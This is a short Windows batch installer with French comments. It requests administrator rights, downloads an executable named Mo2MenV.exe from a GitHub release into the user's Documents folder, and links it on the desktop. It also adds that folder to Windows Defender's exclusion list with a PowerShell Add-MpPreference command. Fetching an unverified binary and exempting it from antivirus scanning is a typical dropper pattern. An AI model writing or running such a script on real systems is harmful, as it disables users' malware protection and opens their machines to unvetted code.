@echo off
setlocal enabledelayedexpansion

:: Vérifier si le script est exécuté en tant qu'administrateur
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Le script doit être exécuté en tant qu'administrateur. Veuillez relancer en tant qu'administrateur.
    pause
    exit /b 1
)

:: Définir le nom du dossier à créer
set "folderName=Mo2MenV"

:: Définir le chemin complet du dossier Documents
set "documentsPath=%USERPROFILE%\Documents"

:: Définir le chemin complet du dossier Mo2MenV dans les Documents
set "folderPath=%documentsPath%\%folderName%"

:: Créer le dossier dans les Documents s'il n'existe pas déjà
if not exist "%folderPath%" (
    mkdir "%folderPath%"
)

:: Vérifier si Mo2MenV.exe existe déjà dans le dossier
if exist "%folderPath%\Mo2MenV.exe" (
    :: Supprimer le fichier Mo2MenV.exe s'il existe
    del "%folderPath%\Mo2MenV.exe"
)

:: Télécharger Mo2MenV.exe depuis l'URL en spécifiant le nom de fichier de sortie
curl -LJ -o "%folderPath%\Mo2MenV.exe" "https://github.com/lolesx/Mo2MenV/releases/download/Mo2Menv/Mo2MenV.exe"

:: Ajouter une exclusion Windows Defender pour le dossier
powershell.exe -Command Add-MpPreference -ExclusionPath "%folderPath%"

:: Créer un lien symbolique vers Mo2MenV.exe sur le bureau
mklink "%USERPROFILE%\Desktop\Mo2MenV.lnk" "%folderPath%\Mo2MenV.exe"

:: Afficher un message de confirmation
echo Le dossier "%folderName%" et le fichier Mo2MenV.exe ont été créés dans les Documents, un raccourci a été créé sur le bureau, et le dossier a été ajouté aux exclusions de Windows Defender dans les Documents.

:: Mettre fin au script
exit /b 0
